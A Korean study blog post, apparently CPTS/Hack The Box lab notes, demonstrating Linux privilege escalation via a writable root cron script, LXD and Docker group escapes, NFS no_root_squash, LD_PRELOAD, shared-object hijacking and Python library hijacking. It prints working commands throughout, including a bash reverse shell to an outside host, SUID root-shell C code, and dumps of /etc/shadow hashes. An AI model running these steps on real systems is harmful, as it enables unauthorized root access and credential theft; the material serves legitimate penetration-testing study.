---
title: "Linux Privilege Escalation - Services and System Internals"
date: 2026-06-09
layout: single
excerpt: "잘못 설정된 Cron Job, 컨테이너, NFS, 공유 객체 및 Python 라이브러리를 악용하여 일반 사용자 권한에서 root 권한을 획득하는 과정을 실습한다."
author_profile: true
toc: true
toc_label: "Linux Privilege Escalation"
toc_icon: "book"
toc_sticky: true
categories: [cpts-infra]
tags: [linux, cpts, priv-esc, cron, containers, nfs, suid, library-hijacking]
---

# Service-based Privilege Escalation

## Cron Job Abuse

리눅스에는 명령이나 스크립트를 정해진 시간에 자동으로 실행하는 cron 서비스가 존재한다.

시스템 전역 작업은 `/etc/crontab` 과 `/etc/cron.*` 디렉터리에서, 사용자별 작업은 각 사용자의 `crontab` 에서 확인할 수 있다.

또한 권한이 낮은 사용자도 실행 중인 프로세스와 예약 작업을 관찰할 수 있도록 [pspy64](https://github.com/DominicBreuker/pspy) 도구를 사용할 수 있다.

이 도구는 새로 생성되는 프로세스를 실시간으로 관찰하여 어떤 명령이 어떤 UID로 실행되는지 화면에 출력한다.

우선 내부 서버에서 pspy64를 실행한 뒤 지켜보았다:

```text
2026/06/09 20:56:01 CMD: UID=0     PID=2254   | /bin/bash /dmz-backups/backup.sh 
2026/06/09 20:56:01 CMD: UID=0     PID=2253   | /bin/sh -c /dmz-backups/backup.sh 
2026/06/09 20:56:01 CMD: UID=0     PID=2252   | /usr/sbin/CRON -f 
2026/06/09 20:56:01 CMD: UID=0     PID=2255   | /bin/bash /dmz-backups/backup.sh 
2026/06/09 20:56:01 CMD: UID=0     PID=2256   | /bin/bash /dmz-backups/backup.sh 
2026/06/09 20:56:01 CMD: UID=0     PID=2257   | /bin/bash /dmz-backups/backup.sh 
```

그 결과 UID 0인 root 사용자가 `/dmz-backups/backup.sh` 를 주기적으로 실행하는 작업을 발견하였다.

따라서 `/dmz-backups/backup.sh` 파일의 내용을 확인하였다:

```bash
htb-student@NIX02:~$ cat /dmz-backups/backup.sh

#!/bin/bash

SRCDIR="/var/www/html"
DESTDIR="/dmz-backups/"
FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
```

`/var/www/html` 경로의 파일을 날짜와 시간이 포함된 `.tgz` 파일로 만들어 `/dmz-backups/` 경로에 저장하는 백업 스크립트이다.

하지만 `backup.sh` 의 권한을 확인해 보면 모든 사용자에게 읽기, 쓰기, 실행 권한이 부여되어 있다:

```bash
htb-student@NIX02:~$ ls -l /dmz-backups/backup.sh

-rwxrwxrwx 1 root root 189 Nov  6  2020 /dmz-backups/backup.sh
```

우선 로컬 터미널에서 nc 리스너를 실행하였다:

```bash
$ nc -lvnp 9001
```

이를 토대로 `backup.sh` 를 덮어써서 실행 시 리버스 셸이 연결되도록 하였다:

```bash
htb-student@NIX02:~$ printf '#!/bin/bash\nbash -i >& /dev/tcp/10.10.15.123/9001 0>&1' > /dmz-backups/backup.sh
```

잠시 기다리면 cron 작업이 스크립트를 root 권한으로 실행하고, 로컬 nc 리스너로 셸이 연결되는 것을 확인할 수 있다:

```bash
$ nc -lvnp 9001                                                          

connect to [10.10.15.123] from (UNKNOWN) [10.129.2.210] 45960
bash: cannot set terminal process group (2342): Inappropriate ioctl for device
bash: no job control in this shell

root@NIX02:~#
```

## Containers 

### LXD

LXD는 LXC를 기반으로 시스템 컨테이너와 이미지를 관리하는 데몬 및 도구 모음으로, 완전한 리눅스 사용자 공간을 담는 컨테이너를 실행할 수 있도록 설계되었다.

호스트와 LXD 컨테이너의 파일시스템과 프로세스 공간은 분리되어 있다.

다만 컨테이너는 호스트의 커널을 공유하므로, 컨테이너 내부의 시스템 호출은 호스트 커널에서 처리된다.

즉, 컨테이너 내부에서 명령을 실행하면 분리된 사용자 공간에서 동작하지만 실제 커널 처리는 호스트 커널이 담당한다.

다음 명령어로 현재 사용자가 `lxd` 그룹에 속해 있는지 확인할 수 있다:

```bash
htb-student@ubuntu:~$ id

uid=1000(htb-student) gid=1000(htb-student) groups=1000(htb-student),116(lxd)
```

현재 사용자의 그룹 목록에 `lxd` 가 포함되어 있는 것을 확인할 수 있다.

LXD를 이용한 권한 상승은 직접 컨테이너 이미지를 생성하여 대상 시스템으로 전송하거나, 시스템에 이미 존재하는 이미지를 사용하는 방식으로 진행할 수 있다.

아래의 컨테이너 이미지를 사용하였다:

```bash
htb-student@ubuntu:~/ContainerImages$ ls

alpine-v3.18-x86_64-20230607_1234.tar.gz
```

Alpine Linux 기반의 컨테이너 이미지이다.

이 이미지에는 경량 Alpine Linux의 루트 파일시스템과 기본 셸 및 도구가 포함되어 있다.

위 이미지를 LXD에 가져왔다:

```bash
htb-student@ubuntu:~/ContainerImages$ lxc image import alpine-v3.18-x86_64-20230607_1234.tar.gz --alias ubuntutemp

Image imported with fingerprint: b14f17d61b9d2997ebe1d3620fbfb2e48773678c186c2294c073e2122c41a485
```

이 명령을 실행하면 해당 파일이 이후 컨테이너 생성에 사용할 수 있는 LXD 이미지로 등록된다.

등록된 이미지 목록을 확인하였다:

```bash
htb-student@ubuntu:~/ContainerImages$ lxc image list

+------------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
|   ALIAS    | FINGERPRINT  | PUBLIC |          DESCRIPTION          | ARCHITECTURE |   TYPE    |  SIZE  |         UPLOAD DATE          |
+------------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
| ubuntutemp | b14f17d61b9d | no     | alpine v3.18 (20230607_12:34) | x86_64       | CONTAINER | 3.62MB | Jun 10, 2026 at 9:09am (UTC) |
+------------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
```

현재 `ubuntutemp` 라는 별칭으로 Alpine 이미지가 등록되어 있음을 확인할 수 있다.

따라서 위 이미지를 기반으로 컨테이너를 생성하였다:

```bash
htb-student@ubuntu:~/ContainerImages$ lxc init ubuntutemp privesc -c security.privileged=true

Creating privesc
```

`ubuntutemp` 라는 Alpine 이미지를 기반으로 `privesc` 라는 컨테이너를 만들고, `security.privileged=true` 를 적용하여 특권 컨테이너로 설정한다.

특권 컨테이너에서는 일반적인 비특권 컨테이너의 UID 매핑이 적용되지 않으므로, 컨테이너의 root가 호스트 파일에 root 권한으로 접근할 수 있는 위험이 생긴다.

이후 호스트의 루트 파일시스템을 컨테이너의 `/mnt/root` 경로에 연결하는 디스크 장치를 추가하였다:

```bash
htb-student@ubuntu:~/ContainerImages$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true

Device host-root added to privesc
```

특권 컨테이너에 호스트의 `/` 경로를 마운트했기 때문에 컨테이너 내부에서 호스트 파일시스템에 접근할 수 있게 된다.

이후 컨테이너를 시작하고 셸을 실행하였다:

```bash
htb-student@ubuntu:~/ContainerImages$ lxc start privesc

htb-student@ubuntu:~/ContainerImages$ lxc exec privesc /bin/sh
```

그 결과 다음과 같은 셸이 나타났다:

```bash
~ # 
```

현재 셸은 컨테이너 내부의 root 셸이다. 마운트된 `/mnt/root` 경로로 이동하면 호스트에 존재하는 파일들이 그대로 보이는 것을 확인할 수 있다:

```bash
/mnt/root # ls

bin         dev         lib         libx32      mnt         root        snap        tmp
boot        etc         lib32       lost+found  opt         run         srv         usr
cdrom       home        lib64       media       proc        sbin        sys         var
```

이후 호스트의 `shadow` 파일을 확인할 수 있다:

```bash
/mnt/root # cat etc/shadow

root:$6$Pi5Dpe48Wsl9kVxX$wN0GZTqJfDKk0VWeRx5NmizUhuQHe6r5Q6JAYyflWPz4slSoaPeSCwBTO5zWgTmlmYOm5zmNI.VgPUgCctb/f0:19515:0:99999:7:::
daemon:*:18375:0:99999:7:::
bin:*:18375:0:99999:7:::

# SKIP
```

### Docker

LXD와 달리 Docker에서는 `/var/run/docker.sock` Unix 소켓을 통해 Docker 데몬에 명령을 전달한다.

현재 사용자가 docker 그룹에 속해 있거나 해당 소켓에 접근할 수 있다면 Docker 데몬을 통해 컨테이너를 생성할 수 있다.

다음과 같이 현재 사용자가 `docker` 그룹에 속해 있는 것을 확인할 수 있다:

```bash
htb-student@ubuntu:~$ id

uid=1001(htb-student) gid=1001(htb-student) groups=1001(htb-student),118(docker)
```

`docker` 그룹에 속하지 않더라도 `sudo docker` 실행 권한이 있거나 Docker 소켓의 권한이 잘못 설정되어 있다면 동일한 위험이 발생할 수 있다.

현재 시스템에 존재하는 Docker 이미지를 확인하였다:

```bash
htb-student@ubuntu:~$ docker image ls

REPOSITORY   TAG       IMAGE ID       CREATED       SIZE
ubuntu       latest    5a81c4b8502e   3 years ago   77.8MB
```

현재 `ubuntu:latest` 이미지가 존재하는 것을 확인할 수 있다.

따라서 이 이미지를 사용해 컨테이너를 실행하면서 호스트의 루트 파일시스템을 마운트하고, 해당 경로를 기준으로 `chroot` 를 수행하였다:

```bash
htb-student@ubuntu:~$ docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```

호스트의 `/` 경로를 컨테이너의 `/mnt` 에 마운트한 뒤, `chroot /mnt bash` 를 통해 호스트 파일시스템을 루트 디렉터리로 사용하는 셸을 실행한다.

그 결과 다음과 같은 셸이 나타났다:

```bash
root@1d09b40ab6e4:/#
```

겉으로는 Docker 컨테이너의 root 셸처럼 보이지만, 현재 프로세스는 호스트의 루트 파일시스템을 기준으로 동작하므로 호스트 파일에 root 권한으로 접근할 수 있다.

따라서 호스트의 `/etc/shadow` 파일을 읽을 수 있다:

```bash
root@1d09b40ab6e4:/# cat /etc/shadow

root:$6$9PpkTHH7CTRkJrYz$OgiHF9yoYUxD9XgaJnFF6K07nyrvhRv/0oA1NJwLRNH9jQr.XLlo5wf/csXuf/2luRS0W2rM7ItULABdeQ8x20:18906:0:99999:7:::
daemon:*:18375:0:99999:7:::
bin:*:18375:0:99999:7:::
```

또한 웹 서버를 통해 셸을 획득했는데 현재 환경이 Docker 컨테이너인 경우도 있다:

```bash
root@5e0527d12d26:/# docker ps 

CONTAINER ID   IMAGE     COMMAND   CREATED          STATUS          PORTS     NAMES
5e0527d12d26   ubuntu    "bash"    23 seconds ago   Up 22 seconds             webserver
```

다음과 같이 Docker 컨테이너 내부에서 웹 서버가 동작하고 있다고 가정하자.

컨테이너 내부에 Docker 소켓이 마운트되어 있고 해당 소켓에 접근할 수 있다면, Docker 데몬을 이용해 새로운 컨테이너를 생성하여 호스트로 탈출할 수 있다:

```bash
root@5e0527d12d26:/# ls -l /var/run/docker.sock 

srw-rw---- 1 root 118 0 Jun 10 12:31 /var/run/docker.sock
```

현재 사용자는 컨테이너 내부의 root이므로 이 권한 설정에서는 Docker 소켓을 사용할 수 있다.

Docker 소켓은 존재하지만 Docker CLI가 없다면 정적 Docker 클라이언트를 가져오거나 Unix 소켓 API를 직접 호출하는 방식으로 데몬과 통신할 수 있다.

우선 두 번째 컨테이너를 생성하였다:

```bash
root@5e0527d12d26:/# docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash

root@75c31b4477ac:/# 
```

그러면 셸이 새 컨테이너로 전환되고, `chroot` 로 인해 호스트 파일시스템의 `/` 를 기준으로 동작하게 된다.

따라서 호스트의 root 권한으로 파일시스템에 접근하는 데 성공할 수 있다.

## Weak NFS Privileges

NFS의 `no_root_squash` 설정을 이용한 권한 상승 방법이다.

먼저 `showmount` 를 실행하여 대상 서버가 공유하는 NFS 경로를 확인하였다:

```bash
$ showmount -e 10.129.2.210    

Export list for 10.129.2.210:
/tmp             *
/var/nfs/general *
```

대상 서버에 접속할 수 있는 상황에서 `/etc/exports` 파일도 확인하였다:

```bash
htb-student@NIX02:~$ cat /etc/exports 

# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/var/nfs/general *(rw,no_root_squash)
/tmp *(rw,no_root_squash)
```

공유 경로는 읽기 및 쓰기가 가능하며 `no_root_squash` 옵션이 적용되어 있다.

`no_root_squash`는 NFS 클라이언트의 UID 0 요청을 익명 사용자로 변환하지 않고 서버에서도 UID 0으로 처리하도록 한다.

예를 들어 클라이언트의 root 사용자가 공유 경로에 파일을 생성하면, 서버에서도 해당 파일의 소유자가 root로 기록될 수 있다.

우선 로컬 시스템에서 대상의 `/tmp` NFS 공유를 `/mnt` 에 마운트하였다:

```bash
$ sudo mount -t nfs 10.129.2.210:/tmp /mnt
```

그 후 로컬에서 `/mnt` 경로로 이동한 뒤 C 소스 파일을 작성하였다:

```bash
$ sudo nano shell.c
```

```c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}
```

의존성 문제를 줄이기 위해 정적 링크 옵션을 사용하여 컴파일하였다:

```bash
$ sudo gcc -static shell.c -o shell
```

그 후 생성된 파일의 권한을 확인하였다:

```bash
$ ls -l shell

-rwxr-xr-x 1 root root 16056 Jun 10 14:17 shell
```

현재 NFS 공유 경로에 root 소유의 `shell` 실행 파일이 생성되어 있다.

`no_root_squash` 가 적용되어 있으므로 서버에서도 이 파일의 소유자는 root로 보인다.

이후 SUID 비트를 부여하여 일반 사용자가 실행해도 파일 소유자인 root의 유효 UID로 동작하도록 설정하였다:

```bash
$ sudo chmod u+s /mnt/shell
```

그 후 서버의 `/tmp` 디렉터리로 이동하여 실행하면:

```bash
htb-student@NIX02:/tmp$ ./shell 

root@NIX02:/tmp#
```

최종적으로 root 권한을 획득하는 데 성공하였다.

# Internals-based Privilege Escalation

## Shared Libraries

우선 `sudo -l` 을 확인하였다:

```bash
htb-student@NIX02:~$ sudo -l

Matching Defaults entries for htb-student on NIX02:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User htb-student may run the following commands on NIX02:
    (root) NOPASSWD: /usr/bin/openssl
```

다음과 같은 설정이 존재한다:

```text
env_keep+=LD_PRELOAD
```

이 설정은 sudo로 실행되는 동적 프로그램에 사용자가 지정한 공유 객체를 `LD_PRELOAD` 로 먼저 로드할 수 있게 하므로 위험할 수 있다.

ldd를 사용하면 프로그램이 로드하는 공유 라이브러리를 확인할 수 있다:

```bash
htb-student@NIX02:~$ ldd /usr/bin/openssl

linux-vdso.so.1 (0x00007ffebf7fb000)
libssl.so.1.1 => /usr/lib/x86_64-linux-gnu/libssl.so.1.1 (0x00007fc1b20ef000)
libcrypto.so.1.1 => /usr/lib/x86_64-linux-gnu/libcrypto.so.1.1 (0x00007fc1b1c24000)
libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007fc1b1a05000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fc1b1614000)
libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fc1b1410000)
/lib64/ld-linux-x86-64.so.2 (0x00007fc1b262f000)
```

허용된 명령이 정적으로 링크된 프로그램이라면 `env_keep+=LD_PRELOAD` 설정이 존재하더라도 공유 객체를 미리 로드할 수 없다.

따라서 이 방식은 실행 시 공유 라이브러리를 로드하는 동적 링크 프로그램을 대상으로 해야 한다.

다음과 같이 C 파일을 작성하였다:

```bash
htb-student@NIX02:~$ nano shell.c
```

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

이후 미리 로드할 공유 객체를 만들기 위해 `.so` 파일로 컴파일하였다:

```bash
htb-student@NIX02:~$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

컴파일 후 `shell.so` 파일이 생성된 것을 확인할 수 있다:

```bash
htb-student@NIX02:~$ ls -l shell.so

-rwxrwxr-x 1 htb-student htb-student 6464 Jun 10 20:54 shell.so
```

`LD_PRELOAD` 에 생성한 공유 객체의 경로를 지정한 뒤, `sudo -l` 에서 허용된 동적 프로그램을 실행한다:

```bash
htb-student@NIX02:~$ sudo LD_PRELOAD=~/shell.so /usr/bin/openssl

root@NIX02:~#
```

이처럼 권한 상승에 성공하였다.

## Shared Object Hijacking

이번에는 SUID 프로그램이 신뢰할 수 없는 경로에서 공유 객체를 로드하는 점을 이용하는 Shared Object Hijacking 공격이다.

내부에 SUID 비트가 적용된 파일이 존재하였다:

```bash
htb-student@NIX02:~/shared_obj_hijack$ ls -l payroll

-rwsr-xr-x 1 root root 16728 Sep  1  2020 payroll
```

이 파일이 로드하는 공유 라이브러리를 확인하면 다음과 같다:

```bash
htb-student@NIX02:~/shared_obj_hijack$ ldd payroll

linux-vdso.so.1 (0x00007ffe23d72000)
libshared.so => /development/libshared.so (0x00007fcf57b2b000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcf5773a000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcf57d2d000)
```

현재 `payroll` 이 여러 공유 라이브러리를 로드하는 것을 확인할 수 있다.

그중 `libshared.so` 가 위치한 `/development` 디렉터리의 권한을 확인하였다:

```bash
htb-student@NIX02:~/shared_obj_hijack$ ls -ld /development

drwxrwxrwx 2 root root 4096 Sep  1  2020 /development
```

이 디렉터리는 모든 사용자에게 읽기, 쓰기, 실행 권한이 부여되어 있다.

따라서 `/development` 경로에 동일한 이름의 악성 `libshared.so` 파일을 만들거나 기존 파일을 교체하면, `payroll` 실행 시 해당 공유 객체가 root 권한으로 로드된다.

우선 `payroll` 의 원본 C 코드를 확인하였다:

```c
#include "dbquery.h"

int main() {
  puts("***************Inlane Freight Employee Database***************\n");
  dbquery();
}
```

`payroll` 은 `dbquery.h` 에 선언된 `dbquery()` 함수를 호출한다.

`dbquery.h` 파일의 내용은 다음과 같다:

```bash
void dbquery(void);
```

`void dbquery(void);` 는 인자를 받지 않고 반환값도 없는 `dbquery` 함수의 선언이다.

따라서 `/development` 내부에 다음과 같이 악성 공유 객체의 소스 코드를 작성하였다:

```bash
htb-student@NIX02:~/shared_obj_hijack$ nano /development/libshared.c
```

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void dbquery(void)
{
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
} 
```

이후 공유 객체로 컴파일하였다:

```bash
htb-student@NIX02:~/shared_obj_hijack$ gcc /development/libshared.c -fPIC -shared -o /development/libshared.so
```

이 상태에서 `payroll` 을 실행하면 악성 `libshared.so` 가 로드된다:

```bash
htb-student@NIX02:~/shared_obj_hijack$ ./payroll 
***************Inlane Freight Employee Database***************

root@NIX02:~/shared_obj_hijack#
```

최종적으로 root 권한을 획득하였다.

## Python Library Hijacking

### Insecure Write Permissions

우선 `sudo -l` 을 확인하였다:

```bash
htb-student@ubuntu:~$ sudo -l

Matching Defaults entries for htb-student on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python3 /home/htb-student/mem_status.py
```

현재 사용자는 비밀번호 없이 `/usr/bin/python3 /home/htb-student/mem_status.py` 명령을 실행할 수 있다.

`mem_status.py` 파일의 내용을 확인하였다:

```python
#!/usr/bin/env python3
import psutil 

available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total

print(f"Available memory: {round(available_memory, 2)}%")
```

이 코드는 전체 메모리 중 사용 가능한 메모리의 비율을 계산하며, `psutil` 모듈의 `virtual_memory()` 함수를 사용한다.

현재 Python 버전은 `3.8.10` 이다:

```bash
htb-student@ubuntu:~$ python3 --version

Python 3.8.10
```

따라서 `virtual_memory()` 함수가 정의된 파일을 검색하였다:

```bash
htb-student@ubuntu:~$ grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*

/usr/local/lib/python3.8/dist-packages/psutil/__init__.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psaix.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psbsd.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pslinux.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psosx.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pssunos.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pswindows.py:def virtual_memory():
```

검색 결과 `psutil` 패키지의 `__init__.py` 와 운영체제별 구현 파일에 `virtual_memory()` 함수가 정의되어 있다. 

`import psutil` 을 실행하면 먼저 패키지의 `__init__.py` 가 로드된다.

따라서 `__init__.py` 파일에 현재 사용자가 쓰기 권한을 가지고 있는지 확인하였다:

```bash
htb-student@ubuntu:~$ ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py

-rw-r--r-- 1 htb-student staff 87657 Jun  8  2023 /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
```

현재 사용자는 `htb-student` 이며 파일의 소유자도 `htb-student` 이므로 쓰기 권한이 존재한다.

`__init__.py` 내부의 `virtual_memory()` 함수는 다음과 같다:

```python
def virtual_memory():
    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret
```

따라서 `virtual_memory()` 함수에 다음 코드를 추가하여 `psutil` 모듈이 import될 때 셸을 실행하도록 하였다:

```python
import os
os.system('/bin/bash')
```

이후 `sudo -l` 에서 허용된 명령을 실행하였다:

```bash
htb-student@ubuntu:~$ sudo /usr/bin/python3 /home/htb-student/mem_status.py
```

그 결과 root 권한의 셸을 획득하였다:

```bash
root@ubuntu:/home/htb-student# 
```

### Python Library Search Path

Python은 모듈을 import할 때 `sys.path` 에 나열된 경로를 위에서부터 순서대로 검색하며, 먼저 발견된 모듈이나 패키지를 사용한다. 

다음 명령어로 현재 검색 경로를 확인할 수 있다:

```bash
htb-student@ubuntu:~$ python3 -c 'import sys; print("\n".join(sys.path))'

/usr/lib/python38.zip
/usr/lib/python3.8
/usr/lib/python3.8/lib-dynload
/usr/local/lib/python3.8/dist-packages
/usr/lib/python3/dist-packages
```

이처럼 Python은 출력된 경로를 위에서부터 순서대로 검색한다.

이 중 `/usr/lib/python3.8` 디렉터리의 권한을 확인하였다:

```bash
htb-student@ubuntu:~$ ls -ld /usr/lib/python3.8

drwxr-xrwx 30 root root 20480 Jun  5  2023 /usr/lib/python3.8
```

이처럼 `/usr/lib/python3.8` 이 다른 사용자에게도 쓰기 가능한 상태라면, 해당 경로에 악성 `/usr/lib/python3.8/psutil.py` 를 생성하여 정상 `psutil` 패키지보다 먼저 로드되도록 만들 수 있다.

### PYTHONPATH Environment Variable

또한 PYTHONPATH 환경 변수를 지정하여 `/tmp` 에 둔 `psutil.py` 가 먼저 검색되도록 시도할 수도 있다:

```bash
htb-student@ubuntu:~$ sudo PYTHONPATH=/tmp/ /usr/bin/python3 /home/htb-student/mem_status.py
```

다만 이 방법은 `sudoers` 에서 환경 변수 설정이 허용된 경우에만 가능하다. 

현재 예시처럼 `SETENV` 권한이나 `env_keep+=PYTHONPATH` 설정이 없다면 오류가 발생하므로 이 방식은 사용할 수 없다.